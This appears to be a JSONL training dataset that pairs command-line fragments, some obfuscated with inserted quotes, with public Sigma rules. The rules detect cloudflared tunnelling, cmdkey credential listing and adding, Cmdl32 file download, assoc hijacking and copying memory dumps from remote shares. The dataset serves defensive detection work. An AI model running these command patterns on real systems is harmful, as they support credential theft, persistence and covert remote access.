{"instruction": "Write Sigma rule to detect payload:", "input": "tunnel \\\"c\\\"\\\"l\\\"\\\"e\\\"\\\"a\\\"\\\"n\\\"\\\"u\\\"\\\"p\\\" -config -connector-id", "output": "title: Cloudflared Tunnel Connections Cleanup\nid: 7050bba1-1aed-454e-8f73-3f46f09ce56a\nstatus: test\ndescription: Detects execution of the \"cloudflared\" tool with the tunnel \"cleanup\" flag in order to cleanup tunnel connections.\nreferences:\n    - https://github.com/cloudflare/cloudflared\n    - https://developers.cloudflare.com/cloudflare-one/connections/connect-apps\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-17\nmodified: 2023-12-21\ntags:\n    - attack.command-and-control\n    - attack.t1102\n    - attack.t1090\n    - attack.t1572\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - ' tunnel '\n            - 'cleanup '\n        CommandLine|contains:\n            - '-config '\n            - '-connector-id '\n    condition: selection\nfalsepositives:\n    - Legitimate usage of Cloudflared.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "tunnel cleanup -config -connector-id", "output": "title: Cloudflared Tunnel Connections Cleanup\nid: 7050bba1-1aed-454e-8f73-3f46f09ce56a\nstatus: test\ndescription: Detects execution of the \"cloudflared\" tool with the tunnel \"cleanup\" flag in order to cleanup tunnel connections.\nreferences:\n    - https://github.com/cloudflare/cloudflared\n    - https://developers.cloudflare.com/cloudflare-one/connections/connect-apps\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-17\nmodified: 2023-12-21\ntags:\n    - attack.command-and-control\n    - attack.t1102\n    - attack.t1090\n    - attack.t1572\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - ' tunnel '\n            - 'cleanup '\n        CommandLine|contains:\n            - '-config '\n            - '-connector-id '\n    condition: selection\nfalsepositives:\n    - Legitimate usage of Cloudflared.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "tunnel run -config -credentials-contents -credentials-file -token", "output": "title: Cloudflared Tunnel Execution\nid: 9a019ffc-3580-4c9d-8d87-079f7e8d3fd4\nstatus: test\ndescription: Detects execution of the \"cloudflared\" tool to connect back to a tunnel. This was seen used by threat actors to maintain persistence and remote access to compromised networks.\nreferences:\n    - https://blog.reconinfosec.com/emergence-of-akira-ransomware-group\n    - https://github.com/cloudflare/cloudflared\n    - https://developers.cloudflare.com/cloudflare-one/connections/connect-apps\nauthor: Janantha Marasinghe, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-17\nmodified: 2023-12-20\ntags:\n    - attack.command-and-control\n    - attack.t1102\n    - attack.t1090\n    - attack.t1572\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - ' tunnel '\n            - ' run '\n        CommandLine|contains:\n            - '-config '\n            - '-credentials-contents '\n            - '-credentials-file '\n            - '-token '\n    condition: selection\nfalsepositives:\n    - Legitimate usage of Cloudflared tunnel.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "tunnel run -config -credentials-contents \\\"-credentials-file\\\" -token", "output": "title: Cloudflared Tunnel Execution\nid: 9a019ffc-3580-4c9d-8d87-079f7e8d3fd4\nstatus: test\ndescription: Detects execution of the \"cloudflared\" tool to connect back to a tunnel. This was seen used by threat actors to maintain persistence and remote access to compromised networks.\nreferences:\n    - https://blog.reconinfosec.com/emergence-of-akira-ransomware-group\n    - https://github.com/cloudflare/cloudflared\n    - https://developers.cloudflare.com/cloudflare-one/connections/connect-apps\nauthor: Janantha Marasinghe, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-17\nmodified: 2023-12-20\ntags:\n    - attack.command-and-control\n    - attack.t1102\n    - attack.t1090\n    - attack.t1572\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - ' tunnel '\n            - ' run '\n        CommandLine|contains:\n            - '-config '\n            - '-credentials-contents '\n            - '-credentials-file '\n            - '-token '\n    condition: selection\nfalsepositives:\n    - Legitimate usage of Cloudflared tunnel.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "tunnel run -config -token -credentials-file -credentials-contents", "output": "title: Cloudflared Tunnel Execution\nid: 9a019ffc-3580-4c9d-8d87-079f7e8d3fd4\nstatus: test\ndescription: Detects execution of the \"cloudflared\" tool to connect back to a tunnel. This was seen used by threat actors to maintain persistence and remote access to compromised networks.\nreferences:\n    - https://blog.reconinfosec.com/emergence-of-akira-ransomware-group\n    - https://github.com/cloudflare/cloudflared\n    - https://developers.cloudflare.com/cloudflare-one/connections/connect-apps\nauthor: Janantha Marasinghe, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-17\nmodified: 2023-12-20\ntags:\n    - attack.command-and-control\n    - attack.t1102\n    - attack.t1090\n    - attack.t1572\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - ' tunnel '\n            - ' run '\n        CommandLine|contains:\n            - '-config '\n            - '-credentials-contents '\n            - '-credentials-file '\n            - '-token '\n    condition: selection\nfalsepositives:\n    - Legitimate usage of Cloudflared tunnel.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmdkey.exe cmdkey.exe -g -u -p", "output": "title: New Generic Credentials Added Via Cmdkey.EXE\nid: b1ec66c6-f4d1-4b5c-96dd-af28ccae7727\nstatus: test\ndescription: |\n    Detects usage of \"cmdkey.exe\" to add generic credentials.\n    As an example, this can be used before connecting to an RDP session via command line interface.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1021.001/T1021.001.md#t1021001---remote-desktop-protocol\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-03\nmodified: 2024-03-05\ntags:\n    - attack.credential-access\n    - attack.t1003.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmdkey.exe'\n        - OriginalFileName: 'cmdkey.exe'\n    selection_cli_generic:\n        CommandLine|contains|windash: ' -g' # Generic\n    selection_cli_user:\n        CommandLine|contains|windash: ' -u' # User\n    selection_cli_password:\n        CommandLine|contains|windash: ' -p' # Password\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage for administration purposes\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmdkey.exe cmdke\"y.exe\" -g -u -p", "output": "title: New Generic Credentials Added Via Cmdkey.EXE\nid: b1ec66c6-f4d1-4b5c-96dd-af28ccae7727\nstatus: test\ndescription: |\n    Detects usage of \"cmdkey.exe\" to add generic credentials.\n    As an example, this can be used before connecting to an RDP session via command line interface.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1021.001/T1021.001.md#t1021001---remote-desktop-protocol\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-03\nmodified: 2024-03-05\ntags:\n    - attack.credential-access\n    - attack.t1003.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmdkey.exe'\n        - OriginalFileName: 'cmdkey.exe'\n    selection_cli_generic:\n        CommandLine|contains|windash: ' -g' # Generic\n    selection_cli_user:\n        CommandLine|contains|windash: ' -u' # User\n    selection_cli_password:\n        CommandLine|contains|windash: ' -p' # Password\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage for administration purposes\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmdkey cmdkey -g -u -p", "output": "title: New Generic Credentials Added Via Cmdkey.EXE\nid: b1ec66c6-f4d1-4b5c-96dd-af28ccae7727\nstatus: test\ndescription: |\n    Detects usage of \"cmdkey.exe\" to add generic credentials.\n    As an example, this can be used before connecting to an RDP session via command line interface.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1021.001/T1021.001.md#t1021001---remote-desktop-protocol\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-03\nmodified: 2024-03-05\ntags:\n    - attack.credential-access\n    - attack.t1003.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmdkey.exe'\n        - OriginalFileName: 'cmdkey.exe'\n    selection_cli_generic:\n        CommandLine|contains|windash: ' -g' # Generic\n    selection_cli_user:\n        CommandLine|contains|windash: ' -u' # User\n    selection_cli_password:\n        CommandLine|contains|windash: ' -p' # Password\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage for administration purposes\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmdkey.exe -p -g -u cmdkey.exe", "output": "title: New Generic Credentials Added Via Cmdkey.EXE\nid: b1ec66c6-f4d1-4b5c-96dd-af28ccae7727\nstatus: test\ndescription: |\n    Detects usage of \"cmdkey.exe\" to add generic credentials.\n    As an example, this can be used before connecting to an RDP session via command line interface.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1021.001/T1021.001.md#t1021001---remote-desktop-protocol\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-03\nmodified: 2024-03-05\ntags:\n    - attack.credential-access\n    - attack.t1003.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmdkey.exe'\n        - OriginalFileName: 'cmdkey.exe'\n    selection_cli_generic:\n        CommandLine|contains|windash: ' -g' # Generic\n    selection_cli_user:\n        CommandLine|contains|windash: ' -u' # User\n    selection_cli_password:\n        CommandLine|contains|windash: ' -p' # Password\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage for administration purposes\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmdkey.exe cmdkey.exe -l", "output": "title: Potential Reconnaissance For Cached Credentials Via Cmdkey.EXE\nid: 07f8bdc2-c9b3-472a-9817-5a670b872f53\nstatus: test\ndescription: Detects usage of cmdkey to look for cached credentials on the system\nreferences:\n    - https://www.peew.pw/blog/2017/11/26/exploring-cmdkey-an-edge-case-for-privilege-escalation\n    - https://technet.microsoft.com/en-us/library/cc754243(v=ws.11).aspx\n    - https://github.com/redcanaryco/atomic-red-team/blob/b27a3cb25025161d49ac861cb216db68c46a3537/atomics/T1003.005/T1003.005.md#atomic-test-1---cached-credential-dump-via-cmdkey\nauthor: jmallette, Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-01-16\nmodified: 2024-03-05\ntags:\n    - attack.credential-access\n    - attack.t1003.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmdkey.exe'\n        - OriginalFileName: 'cmdkey.exe'\n    selection_cli:\n        CommandLine|contains|windash: ' -l'\n    condition: all of selection*\nfields:\n    - CommandLine\n    - ParentCommandLine\n    - User\nfalsepositives:\n    - Legitimate administrative tasks\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmdkey.exe \"cmdkey.exe\" -l", "output": "title: Potential Reconnaissance For Cached Credentials Via Cmdkey.EXE\nid: 07f8bdc2-c9b3-472a-9817-5a670b872f53\nstatus: test\ndescription: Detects usage of cmdkey to look for cached credentials on the system\nreferences:\n    - https://www.peew.pw/blog/2017/11/26/exploring-cmdkey-an-edge-case-for-privilege-escalation\n    - https://technet.microsoft.com/en-us/library/cc754243(v=ws.11).aspx\n    - https://github.com/redcanaryco/atomic-red-team/blob/b27a3cb25025161d49ac861cb216db68c46a3537/atomics/T1003.005/T1003.005.md#atomic-test-1---cached-credential-dump-via-cmdkey\nauthor: jmallette, Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-01-16\nmodified: 2024-03-05\ntags:\n    - attack.credential-access\n    - attack.t1003.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmdkey.exe'\n        - OriginalFileName: 'cmdkey.exe'\n    selection_cli:\n        CommandLine|contains|windash: ' -l'\n    condition: all of selection*\nfields:\n    - CommandLine\n    - ParentCommandLine\n    - User\nfalsepositives:\n    - Legitimate administrative tasks\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmdkey cmdkey -l", "output": "title: Potential Reconnaissance For Cached Credentials Via Cmdkey.EXE\nid: 07f8bdc2-c9b3-472a-9817-5a670b872f53\nstatus: test\ndescription: Detects usage of cmdkey to look for cached credentials on the system\nreferences:\n    - https://www.peew.pw/blog/2017/11/26/exploring-cmdkey-an-edge-case-for-privilege-escalation\n    - https://technet.microsoft.com/en-us/library/cc754243(v=ws.11).aspx\n    - https://github.com/redcanaryco/atomic-red-team/blob/b27a3cb25025161d49ac861cb216db68c46a3537/atomics/T1003.005/T1003.005.md#atomic-test-1---cached-credential-dump-via-cmdkey\nauthor: jmallette, Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-01-16\nmodified: 2024-03-05\ntags:\n    - attack.credential-access\n    - attack.t1003.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmdkey.exe'\n        - OriginalFileName: 'cmdkey.exe'\n    selection_cli:\n        CommandLine|contains|windash: ' -l'\n    condition: all of selection*\nfields:\n    - CommandLine\n    - ParentCommandLine\n    - User\nfalsepositives:\n    - Legitimate administrative tasks\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmdkey.exe cmdkey.exe -l", "output": "title: Potential Reconnaissance For Cached Credentials Via Cmdkey.EXE\nid: 07f8bdc2-c9b3-472a-9817-5a670b872f53\nstatus: test\ndescription: Detects usage of cmdkey to look for cached credentials on the system\nreferences:\n    - https://www.peew.pw/blog/2017/11/26/exploring-cmdkey-an-edge-case-for-privilege-escalation\n    - https://technet.microsoft.com/en-us/library/cc754243(v=ws.11).aspx\n    - https://github.com/redcanaryco/atomic-red-team/blob/b27a3cb25025161d49ac861cb216db68c46a3537/atomics/T1003.005/T1003.005.md#atomic-test-1---cached-credential-dump-via-cmdkey\nauthor: jmallette, Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-01-16\nmodified: 2024-03-05\ntags:\n    - attack.credential-access\n    - attack.t1003.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmdkey.exe'\n        - OriginalFileName: 'cmdkey.exe'\n    selection_cli:\n        CommandLine|contains|windash: ' -l'\n    condition: all of selection*\nfields:\n    - CommandLine\n    - ParentCommandLine\n    - User\nfalsepositives:\n    - Legitimate administrative tasks\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmdl32.exe CMDL32.EXE /vpn /lan", "output": "title: Potential Arbitrary File Download Via Cmdl32.EXE\nid: f37aba28-a9e6-4045-882c-d5004043b337\nstatus: test\ndescription: |\n    Detects execution of Cmdl32 with the \"/vpn\" and \"/lan\" flags.\n    Attackers can abuse this utility in order to download arbitrary files via a configuration file.\n    Inspect the location and the content of the file passed as an argument in order to determine if it is suspicious.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Cmdl32/\n    - https://twitter.com/SwiftOnSecurity/status/1455897435063074824\n    - https://github.com/LOLBAS-Project/LOLBAS/pull/151\nauthor: frack113\ndate: 2021-11-03\nmodified: 2024-04-22\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1218\n    - attack.t1202\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmdl32.exe'\n        - OriginalFileName: CMDL32.EXE\n    selection_cli:\n        CommandLine|contains|all:\n            - '/vpn'\n            - '/lan'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmdl32.exe \"C\"\"M\"\"D\"\"L\"\"3\"\"2\"\".\"\"E\"\"X\"\"E\" /vpn /lan", "output": "title: Potential Arbitrary File Download Via Cmdl32.EXE\nid: f37aba28-a9e6-4045-882c-d5004043b337\nstatus: test\ndescription: |\n    Detects execution of Cmdl32 with the \"/vpn\" and \"/lan\" flags.\n    Attackers can abuse this utility in order to download arbitrary files via a configuration file.\n    Inspect the location and the content of the file passed as an argument in order to determine if it is suspicious.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Cmdl32/\n    - https://twitter.com/SwiftOnSecurity/status/1455897435063074824\n    - https://github.com/LOLBAS-Project/LOLBAS/pull/151\nauthor: frack113\ndate: 2021-11-03\nmodified: 2024-04-22\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1218\n    - attack.t1202\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmdl32.exe'\n        - OriginalFileName: CMDL32.EXE\n    selection_cli:\n        CommandLine|contains|all:\n            - '/vpn'\n            - '/lan'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmdl32.exe CMDL32.EXE -vpn /lan", "output": "title: Potential Arbitrary File Download Via Cmdl32.EXE\nid: f37aba28-a9e6-4045-882c-d5004043b337\nstatus: test\ndescription: |\n    Detects execution of Cmdl32 with the \"/vpn\" and \"/lan\" flags.\n    Attackers can abuse this utility in order to download arbitrary files via a configuration file.\n    Inspect the location and the content of the file passed as an argument in order to determine if it is suspicious.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Cmdl32/\n    - https://twitter.com/SwiftOnSecurity/status/1455897435063074824\n    - https://github.com/LOLBAS-Project/LOLBAS/pull/151\nauthor: frack113\ndate: 2021-11-03\nmodified: 2024-04-22\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1218\n    - attack.t1202\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmdl32.exe'\n        - OriginalFileName: CMDL32.EXE\n    selection_cli:\n        CommandLine|contains|all:\n            - '/vpn'\n            - '/lan'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmdl32 CMDL32 /vpn /lan", "output": "title: Potential Arbitrary File Download Via Cmdl32.EXE\nid: f37aba28-a9e6-4045-882c-d5004043b337\nstatus: test\ndescription: |\n    Detects execution of Cmdl32 with the \"/vpn\" and \"/lan\" flags.\n    Attackers can abuse this utility in order to download arbitrary files via a configuration file.\n    Inspect the location and the content of the file passed as an argument in order to determine if it is suspicious.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Cmdl32/\n    - https://twitter.com/SwiftOnSecurity/status/1455897435063074824\n    - https://github.com/LOLBAS-Project/LOLBAS/pull/151\nauthor: frack113\ndate: 2021-11-03\nmodified: 2024-04-22\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1218\n    - attack.t1202\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmdl32.exe'\n        - OriginalFileName: CMDL32.EXE\n    selection_cli:\n        CommandLine|contains|all:\n            - '/vpn'\n            - '/lan'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmdl32.exe CMDL32.EXE /vpn /lan", "output": "title: Potential Arbitrary File Download Via Cmdl32.EXE\nid: f37aba28-a9e6-4045-882c-d5004043b337\nstatus: test\ndescription: |\n    Detects execution of Cmdl32 with the \"/vpn\" and \"/lan\" flags.\n    Attackers can abuse this utility in order to download arbitrary files via a configuration file.\n    Inspect the location and the content of the file passed as an argument in order to determine if it is suspicious.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Cmdl32/\n    - https://twitter.com/SwiftOnSecurity/status/1455897435063074824\n    - https://github.com/LOLBAS-Project/LOLBAS/pull/151\nauthor: frack113\ndate: 2021-11-03\nmodified: 2024-04-22\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1218\n    - attack.t1202\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmdl32.exe'\n        - OriginalFileName: CMDL32.EXE\n    selection_cli:\n        CommandLine|contains|all:\n            - '/vpn'\n            - '/lan'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe Cmd.Exe assoc", "output": "title: Change Default File Association Via Assoc\nid: 3d3aa6cd-6272-44d6-8afc-7e88dfef7061\nrelated:\n    - id: ae6f14e6-14de-45b0-9f44-c0986f50dc89\n      type: similar\nstatus: test\ndescription: |\n    Detects file association changes using the builtin \"assoc\" command.\n    When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility. Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1546.001/T1546.001.md\nauthor: Timur Zinniatullin, oscd.community\ndate: 2019-10-21\nmodified: 2023-03-06\ntags:\n    - attack.persistence\n    - attack.t1546.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_cli:\n        CommandLine|contains: 'assoc'\n    condition: all of selection_*\nfields:\n    - Image\n    - CommandLine\n    - User\n    - LogonGuid\n    - Hashes\n    - ParentProcessGuid\n    - ParentCommandLine\nfalsepositives:\n    - Admin activity\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe \\\"Cmd.Exe\\\" \\\"assoc\\\"", "output": "title: Change Default File Association Via Assoc\nid: 3d3aa6cd-6272-44d6-8afc-7e88dfef7061\nrelated:\n    - id: ae6f14e6-14de-45b0-9f44-c0986f50dc89\n      type: similar\nstatus: test\ndescription: |\n    Detects file association changes using the builtin \"assoc\" command.\n    When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility. Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1546.001/T1546.001.md\nauthor: Timur Zinniatullin, oscd.community\ndate: 2019-10-21\nmodified: 2023-03-06\ntags:\n    - attack.persistence\n    - attack.t1546.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_cli:\n        CommandLine|contains: 'assoc'\n    condition: all of selection_*\nfields:\n    - Image\n    - CommandLine\n    - User\n    - LogonGuid\n    - Hashes\n    - ParentProcessGuid\n    - ParentCommandLine\nfalsepositives:\n    - Admin activity\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd Cmd assoc", "output": "title: Change Default File Association Via Assoc\nid: 3d3aa6cd-6272-44d6-8afc-7e88dfef7061\nrelated:\n    - id: ae6f14e6-14de-45b0-9f44-c0986f50dc89\n      type: similar\nstatus: test\ndescription: |\n    Detects file association changes using the builtin \"assoc\" command.\n    When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility. Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1546.001/T1546.001.md\nauthor: Timur Zinniatullin, oscd.community\ndate: 2019-10-21\nmodified: 2023-03-06\ntags:\n    - attack.persistence\n    - attack.t1546.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_cli:\n        CommandLine|contains: 'assoc'\n    condition: all of selection_*\nfields:\n    - Image\n    - CommandLine\n    - User\n    - LogonGuid\n    - Hashes\n    - ParentProcessGuid\n    - ParentCommandLine\nfalsepositives:\n    - Admin activity\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe Cmd.Exe assoc", "output": "title: Change Default File Association Via Assoc\nid: 3d3aa6cd-6272-44d6-8afc-7e88dfef7061\nrelated:\n    - id: ae6f14e6-14de-45b0-9f44-c0986f50dc89\n      type: similar\nstatus: test\ndescription: |\n    Detects file association changes using the builtin \"assoc\" command.\n    When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility. Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1546.001/T1546.001.md\nauthor: Timur Zinniatullin, oscd.community\ndate: 2019-10-21\nmodified: 2023-03-06\ntags:\n    - attack.persistence\n    - attack.t1546.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_cli:\n        CommandLine|contains: 'assoc'\n    condition: all of selection_*\nfields:\n    - Image\n    - CommandLine\n    - User\n    - LogonGuid\n    - Hashes\n    - ParentProcessGuid\n    - ParentCommandLine\nfalsepositives:\n    - Admin activity\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe Cmd.Exe copy \\\\\\\\ .dmp .dump .hdmp", "output": "title: Copy .DMP/.DUMP Files From Remote Share Via Cmd.EXE\nid: 044ba588-dff4-4918-9808-3f95e8160606\nstatus: test\ndescription: Detects usage of the copy builtin cmd command to copy files with the \".dmp\"/\".dump\" extension from a remote share\nreferences:\n    - https://thedfirreport.com/2022/09/26/bumblebee-round-two/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-27\nmodified: 2023-09-12\ntags:\n    - attack.credential-access\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    # Example: copy \\\\<host>\\\\<folder>\\\\process.dmp C:\\Users\\process.dmp\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'copy '\n            - ' \\\\\\\\'\n        CommandLine|contains:\n            - '.dmp'\n            - '.dump'\n            - '.hdmp'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe Cmd.Exe copy \\\\\\\\ .dmp \\\".\\\"\\\"d\\\"\\\"u\\\"\\\"m\\\"\\\"p\\\" .hdmp", "output": "title: Copy .DMP/.DUMP Files From Remote Share Via Cmd.EXE\nid: 044ba588-dff4-4918-9808-3f95e8160606\nstatus: test\ndescription: Detects usage of the copy builtin cmd command to copy files with the \".dmp\"/\".dump\" extension from a remote share\nreferences:\n    - https://thedfirreport.com/2022/09/26/bumblebee-round-two/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-27\nmodified: 2023-09-12\ntags:\n    - attack.credential-access\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    # Example: copy \\\\<host>\\\\<folder>\\\\process.dmp C:\\Users\\process.dmp\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'copy '\n            - ' \\\\\\\\'\n        CommandLine|contains:\n            - '.dmp'\n            - '.dump'\n            - '.hdmp'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd Cmd copy \\\\\\\\ .dmp .dump .hdmp", "output": "title: Copy .DMP/.DUMP Files From Remote Share Via Cmd.EXE\nid: 044ba588-dff4-4918-9808-3f95e8160606\nstatus: test\ndescription: Detects usage of the copy builtin cmd command to copy files with the \".dmp\"/\".dump\" extension from a remote share\nreferences:\n    - https://thedfirreport.com/2022/09/26/bumblebee-round-two/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-27\nmodified: 2023-09-12\ntags:\n    - attack.credential-access\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    # Example: copy \\\\<host>\\\\<folder>\\\\process.dmp C:\\Users\\process.dmp\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'copy '\n            - ' \\\\\\\\'\n        CommandLine|contains:\n            - '.dmp'\n            - '.dump'\n            - '.hdmp'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
